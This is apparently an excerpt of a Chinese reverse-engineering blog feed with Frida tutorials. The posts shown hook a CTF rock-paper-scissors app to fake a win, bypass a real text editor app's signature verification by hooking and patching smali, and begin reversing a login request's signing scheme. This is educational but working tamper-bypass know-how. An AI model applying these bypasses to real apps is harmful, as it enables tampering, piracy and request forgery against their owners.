</span><br><span class="line">test=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Java.perform(</span></span><br><span class="line"><span class="string">    function()&#123;</span></span><br><span class="line"><span class="string">        console.log(&#x27;i am coming&#x27;)   #判断是否已经进来</span></span><br><span class="line"><span class="string">        var MainActivity = Java.use(&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity&#x27;) #类名 绝对路径,直接复制</span></span><br><span class="line"><span class="string">        MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">            this.onClick(v)</span></span><br><span class="line"><span class="string">            console.log(&#x27;mmm:&#x27;+this.m.value)</span></span><br><span class="line"><span class="string">            console.log(&#x27;nnn:&#x27;+this.n.value)</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var TT = Java.use(&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity$1&#x27;)</span></span><br><span class="line"><span class="string">        TT.run.implementation = function()&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            this.this$0.value.m.value = 1</span></span><br><span class="line"><span class="string">            this.this$0.value.n.value = 2</span></span><br><span class="line"><span class="string">            this.run()</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>    </span><br><span class="line"><span class="comment">#两种启动方式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attach 进程名 ：APP启动后再hook，不能hook app启动阶段 </span></span><br><span class="line">process = frida.get_usb_device(-<span class="number">1</span>).attach(<span class="string">&#x27;com.example.seccon2015.rock_paper_scissors&#x27;</span>)</span><br><span class="line"><span class="comment">##进程名 也是AndroidManifest.xml 里的包名,可以通过</span></span><br><span class="line">    <span class="comment">##如果找不到可通过 frida-ps -U 来查找进程名.</span></span><br><span class="line">script = process.create_script(test)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动方式2 spawn 重启APP 可以hook APP启动阶段</span></span><br><span class="line"><span class="comment"># device = frida.get_usb_device(-1)</span></span><br><span class="line"><span class="comment"># pid = device.spawn([&#x27;com.example.seccon2015.rock_paper_scissors&#x27;])</span></span><br><span class="line"><span class="comment"># process = device.attach(pid)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># script = process.create_script(test)</span></span><br><span class="line"><span class="comment"># script.on(&#x27;message&#x27;, on_message)</span></span><br><span class="line"><span class="comment"># print(&#x27;[*] Running&#x27;)</span></span><br><span class="line"><span class="comment"># script.load()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># device.resume(pid)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sys.stdin.read()</span></span><br></pre></td></tr></table></figure><p><strong>打印手机所有运行包名</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().enumerate_processes()</span><br><span class="line"><span class="built_in">print</span>(process)</span><br></pre></td></tr></table></figure><p><strong>两种启动hook方式</strong>：</p><ol><li>attach 进程名 ：APP启动后再hook，不能hook app启动阶段</li><li>spawn ：重启APP，适合hook app 启动阶段</li></ol><p><strong>常用的hook方法:</strong></p><p>java代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.flag != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.flag = <span class="number">1</span>;</span><br><span class="line">            TextView tv3 = (TextView) findViewById(R.id.textView3);</span><br><span class="line">            tv3.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            TextView tv = (TextView) findViewById(R.id.textView);</span><br><span class="line">            TextView tv2 = (TextView) findViewById(R.id.textView2);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            Random rm = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="keyword">this</span>.n = rm.nextInt(<span class="number">3</span>);</span><br><span class="line">            String[] ss = &#123;<span class="string">&quot;CPU: Paper&quot;</span>, <span class="string">&quot;CPU: Rock&quot;</span>, <span class="string">&quot;CPU: Scissors&quot;</span>&#125;;</span><br><span class="line">            tv2.setText(ss[<span class="keyword">this</span>.n]);</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.P) &#123;</span><br><span class="line">                tv.setText(<span class="string">&quot;YOU: Paper&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.r) &#123;</span><br><span class="line">                tv.setText(<span class="string">&quot;YOU: Rock&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.S) &#123;</span><br><span class="line">                tv.setText(<span class="string">&quot;YOU: Scissors&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.handler.postDelayed(<span class="keyword">this</span>.showMessageTask, <span class="number">1000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>hook 类方和访问成员变量</strong></p><p>先java.use()一个类名,然后在调用它的方法,从而进行改写.这里用<strong>this.成员变量.value</strong>来访问成员变量.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="comment">//固定的js函数写法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> activity = Java.use(<span class="string">&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity&#x27;</span>)</span><br><span class="line"><span class="comment">//Java.use 一个类名到变量activity,类名从jadx复制.</span></span><br><span class="line">activity.onClick.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123; <span class="comment">//这里调用onClick方法</span></span><br><span class="line">    <span class="built_in">this</span>.onClick(v)<span class="comment">//这里重写方法</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;me:&#x27;</span>+<span class="built_in">this</span>.m.value)<span class="comment">//这里访问成员变量m</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;jj:&#x27;</span>+<span class="built_in">this</span>.n.value)<span class="comment">//这里访问成员变量n</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>hook 匿名类</strong></p><p>java代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    Button P;</span><br><span class="line">    Button S;</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    Button r;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Handler handler = <span class="keyword">new</span> Handler(); <span class="comment">//当用final修饰一个类时，表明这个类不能被继承</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Runnable showMessageTask = <span class="keyword">new</span> Runnable() &#123; <span class="comment">// from class: com.example.seccon2015.rock_paper_scissors.MainActivity.1</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// java.lang.Runnable</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;   <span class="comment">//void 是java中的关键字,定义方法用它修饰表示什么也不返回.</span></span><br><span class="line">            TextView tv3 = (TextView) MainActivity.<span class="keyword">this</span>.findViewById(R.id.textView3);</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.n - MainActivity.<span class="keyword">this</span>.m == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">                tv3.setText(<span class="string">&quot;WIN! +&quot;</span> + String.valueOf(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m - MainActivity.<span class="keyword">this</span>.n == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                tv3.setText(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m == MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                tv3.setText(<span class="string">&quot;DRAW +&quot;</span> + String.valueOf(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m &lt; MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                tv3.setText(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">                tv3.setText(<span class="string">&quot;WIN! +&quot;</span> + String.valueOf(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">                tv3.setText(<span class="string">&quot;SECCON&#123;&quot;</span> + String.valueOf((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.calc()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hook 匿名类方法:</p><p> 类名去apktools -d 包名    然后到smali文件里搜索方法,存在这个方法的文件名,就是这个类名.</p><p>文件路径:com/example/seccon2015/rock_paper_scissors/MainActivity$1</p><p>类名:com.example.seccon2015.rock_paper_scissors.MainActivity$1</p><p>如代码例1-1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java.use(&#x27;类$类&#x27;)</span><br></pre></td></tr></table></figure><p><strong>从匿名类/内部类访问外部类的属性</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.this$0.value.外部类的属性名.value</span><br></pre></td></tr></table></figure><p>例1-1:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="comment">//固定的js函数写法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> act = Java.use(<span class="string">&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity$1&#x27;</span>)</span><br><span class="line"><span class="comment">//hook匿名类</span></span><br><span class="line">act.run.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.this$0.value.m.value = <span class="number">1</span><span class="comment">//访问外部类,或者匿名类.</span></span><br><span class="line">    <span class="built_in">this</span>.this$0.value.n.value = <span class="number">2</span></span><br><span class="line">    <span class="built_in">this</span>.run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;APP文件结构&quot;&gt;&lt;a href=&quot;#APP文件结构&quot; class=&quot;headerlink&quot; title=&quot;APP文件结构&quot;&gt;&lt;/a&gt;APP文件结构&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;apk&lt;/strong&gt;文件，一种压缩包:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;class</summary>
      
    
    
    
    
    <category term="逆向" scheme="https://bstark.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Frida 过APP签名校验</title>
    <link href="https://bstark.me/posts/22137/"/>
    <id>https://bstark.me/posts/22137/</id>
    <published>2022-01-20T07:01:34.000Z</published>
    <updated>2022-04-01T06:35:18.019Z</updated>
    
    <content type="html"><![CDATA[<p>判断APP是否存在签名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -printcert -jarfile app-debug.apk</span><br></pre></td></tr></table></figure><p>如果存在签名，就不能通过修改代码，重新编译对它进行篡改了，这时候我们只能通过Frida去hook分析判断,存在签名校验的相关函数,改写它,使它return true.从而过掉签名校验,任意的去修改代码从新编译了.</p><p><strong>反编译找到签名校验的关键点</strong></p><p><strong>context</strong>类:可以理解为“上下文”或者“场景”</p><p><strong>packageManager</strong>类:获取安卓信息和APP的信息</p><p><strong>signature</strong>类:提供数字签名算法功能,生成和验证数字签名</p><p>签名关键字:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.getPackageManager().getPackageInfo(context.getPackageName(), <span class="number">64</span>).signatures[<span class="number">0</span>].hashCode()</span><br></pre></td></tr></table></figure><p><strong>如果搜索不到相关的函数存在以下可能:</strong></p><p>1.通过代码混淆</p><p>2.写到了so文件</p><p>3.或者其他的技术</p><p>Signature公共方法</p><p> <a href="https://developer.android.google.cn/reference/android/content/pm/Signature">https://developer.android.google.cn/reference/android/content/pm/Signature</a></p><p><strong>代码混淆的情况:</strong></p><p>直接hook 系统类Signature的公共方法,因为不能确定目标APP使用是那种方法所以我们直接hook来一个一个判断</p><table><thead><tr><th><a href="https://developer.android.google.cn/reference/java/lang/Object">java.lang.Object</a></th><th></th></tr></thead><tbody><tr><td>↳类名</td><td>android.content.pm.Signature</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> Signature = Java.use(<span class="string">&#x27;android.content.pm.Signature&#x27;</span>)</span><br><span class="line">    Signature.toByteArray.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;toByteArray&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.toByteArray()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> Signature = Java.use(<span class="string">&#x27;android.content.pm.Signature&#x27;</span>)</span><br><span class="line">    Signature.hashCode.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;hashCode&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.hashCode()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">var</span> Signature = Java.use(<span class="string">&#x27;android.content.pm.Signature&#x27;</span>)</span><br><span class="line">     Signature.toCharsString.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">&#x27;toCharsString&#x27;</span>)</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">this</span>.toCharsString()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>打印调用堆栈找到具体代码位置</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> Signature = Java.use(<span class="string">&#x27;android.content.pm.Signature&#x27;</span>)</span><br><span class="line">    Signature.toByteArray.implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;toByteArray&#x27;</span>)</span><br><span class="line">        printstack()     <span class="comment">//执行打印调用堆栈的函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.toByteArray()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印调用堆栈</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">printstack</span>(<span class="params"></span>) </span>&#123;    <span class="built_in">console</span>.log(Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>打印如下:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] Running</span><br><span class="line">toByteArray</span><br><span class="line">java.lang.Exception</span><br><span class="line">at android.content.pm.Signature.toByteArray(Native Method)</span><br><span class="line">at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">at com.chaozhuo.texteditor.widget.a.a(ARHelper.java:203)</span><br><span class="line">at com.chaozhuo.texteditor.widget.a.a(ARHelper.java:159)</span><br><span class="line">at com.chaozhuo.texteditor.widget.b.doInBackground(ARHelper.java:68)</span><br><span class="line">at android.os.AsyncTask$2.call(AsyncTask.java:333)</span><br><span class="line">at java.util.concurrent.FutureTask.run(FutureTask.java:266)</span><br><span class="line">at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:245)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)</span><br><span class="line">at java.lang.Thread.run(Thread.java:764)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析可得知具体代码在:</p><p><code>at com.chaozhuo.texteditor.widget.a.a</code></p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220316170431165.png" alt="image-20220316170431165"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] a2 = a((<span class="keyword">byte</span>[]) a(((Object[]) b(a(a(context, a(<span class="string">&quot;Z2V0UGFja2FnZU1hbmFnZXI=&quot;</span>)), a(<span class="string">&quot;Z2V0UGFja2FnZUluZm8=&quot;</span>), (String) a(context, a(<span class="string">&quot;Z2V0UGFja2FnZU5hbWU=&quot;</span>)), String.class, <span class="number">64</span>, Integer.TYPE), a(<span class="string">&quot;c2lnbmF0dXJlcw==&quot;</span>)))[<span class="number">0</span>], a(<span class="string">&quot;dG9CeXRlQXJyYXk=&quot;</span>)));</span><br></pre></td></tr></table></figure><p>可知代码经过了base64进行了混淆,还原后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] a2 = a((<span class="keyword">byte</span>[]) a(((Object[]) b(a(a(context, a(<span class="string">&quot;getPackageManager&quot;</span>)), a(<span class="string">&quot;getPackageInfo&quot;</span>), (String) a(context, a(<span class="string">&quot;getPackageName&quot;</span>)), String.class, <span class="number">64</span>, Integer.TYPE), a(<span class="string">&quot;signatures&quot;</span>)))[<span class="number">0</span>], a(<span class="string">&quot;toByteArray&quot;</span>)));</span><br></pre></td></tr></table></figure><p>很明显它是一个<strong>反射调用</strong>实现的,屏蔽实现细节隐藏了代码特征检测,这是我们无法通过系统签名校验的关键字搜索到相关代码的原因.</p><p>反射调用:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj.getClass().getMethod(<span class="string">&#x27;方法名字符串&#x27;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]).invoke(obj, <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">obj.getClass().getMethod(str, <span class="keyword">new</span> Class[<span class="number">0</span>]).invoke(obj, <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context.getClass().getMethod(<span class="string">&#x27;getPackageManager&#x27;</span>, <span class="keyword">new</span></span><br><span class="line">Class[<span class="number">0</span>]).invoke(context, <span class="keyword">new</span> Context[<span class="number">0</span>]);</span><br><span class="line">context.getPackageManager()</span><br></pre></td></tr></table></figure><p>hook a类验证</p><p>由于存在类方法重载需要指定具体参数（overload）即一个类下面存在多个a方法,这时候我们需要指定具体的参数.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Signature = Java.use(<span class="string">&#x27;com.chaozhuo.texteditor.widget.a&#x27;</span>)</span><br><span class="line">    Signature.a.overload(<span class="string">&#x27;android.content.Context&#x27;</span>).implementation=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//overload(&#x27;android.content.Context&#x27;) 类的方法重载</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>   <span class="comment">//由于我们hook的这个方法没有往下走的逻辑,所以我们不需要写this.a(),直接return true</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>也可以直接hook a方法,从报错中选择要hook的方法如:</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220316173549684.png" alt="image-20220316173549684"></p><p>这里就完成了frida hook 过签名校验的过程.如果高频使用app,不想每次都Hook过签名校验,我们可以从新修改smail代码编译APP．</p><p><strong>修改smali源码过签名校验</strong></p><p>找到smali代码,/com/chaozhuo/texteditor/widget/a/a</p><p>搜索对应的位置,删除签名校验代码</p><p>新增 return true代码</p><p>smali代码: 可以用 java2smali转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.registers 2    </span><br><span class="line">    const/4 v1,0x1</span><br><span class="line">    return v1</span><br></pre></td></tr></table></figure><p>从新编译打包,安装手机后即可过掉校验.</p><p><strong>步骤</strong></p><p>先jadx反编译分析代码-搜索分析找到签名校验的关键点.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;判断APP是否存在签名&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td clas</summary>
      
    
    
    
    
    <category term="逆向" scheme="https://bstark.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>frida rpc 远程主动调用APP加密函数</title>
    <link href="https://bstark.me/posts/58074/"/>
    <id>https://bstark.me/posts/58074/</id>
    <published>2022-01-18T07:01:34.000Z</published>
    <updated>2022-04-01T06:34:31.837Z</updated>
    
    <content type="html"><![CDATA[<p><strong>抓包分析app:</strong></p><p>登录POST请求:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /loginUser HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 322</span><br><span class="line">Host: api.passport.test.com</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: okhttp/3.11.0</span><br><span class="line"></span><br><span class="line">apiaccount=vrpuc-aaf91f835147ce2d01216bd3bd5c3516&amp;phone=18812345600&amp;sign=A31C4B536BA9BE0916548DD34BEB0985&amp;enc=Uz8aJcfYfJbdFo797QKb4SN3LQGA%2FFNY6qIBl046sSGco7r0PgNV67K6jIzgI7E9Y9Ag4%2FpctSEJrDey6qU33na%2Beci9FvB%2FgczumGGbxKXjxkO3qqfoZkRKsuy%2Bbf%2FBS7ZvgYj%2BhFXZixchs9QTgtf8uqFC4C8BjnBvqfVcCCk%3D&amp;timestamp=1647961433279</span><br></pre></td></tr></table></figure><p>经过分析 sign,enc加密,导致无法篡改请求包,其中密码也加密了.</p><p>逆向APP:</p><p>搜索请求参数名定位相关代码,在一通hook分析验证,确定了两个代码位置函数加密点.</p><p>enc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> O <span class="title">d</span><span class="params">(String str, String str2)</span> </span>&#123;</span><br><span class="line">       HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">       hashMap.put(<span class="string">&quot;phone&quot;</span>, str);</span><br><span class="line">       